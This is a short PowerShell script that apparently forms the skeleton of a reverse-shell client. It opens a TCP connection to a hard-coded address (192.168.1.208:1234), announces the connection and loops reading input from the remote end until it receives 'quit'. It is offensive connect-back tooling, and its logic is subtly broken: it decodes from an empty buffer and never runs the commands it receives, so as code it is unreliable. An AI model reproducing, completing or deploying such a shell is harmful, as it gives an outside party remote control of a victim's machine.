$hostname = '192.168.1.208'
$port = 1234
$socket = new-object System.Net.Sockets.TcpClient($hostname, $port)
$stream = $socket.GetStream()
$buffer = new-object System.Byte[] 1024
$encoding = new-object System.Text.AsciiEncoding
$writer = new-object System.IO.StreamWriter($stream)
$reader = new-object System.IO.StreamReader($stream)
$writer.Write('[*] Connection Established!\n')
while (1 -eq 1){
    $read = $reader.ReadLine()
	$out = $encoding.GetString($buffer, 0, $read).Replace("`r`n","").Replace("`n","")
    $writer.Write($out)
	if(!$out.equals("quit")){
	} else {
        $reader.Dispose()
        $writer.Dispose()
        $stream.Dispose()
        $socket.Dispose()
        exit
    }
}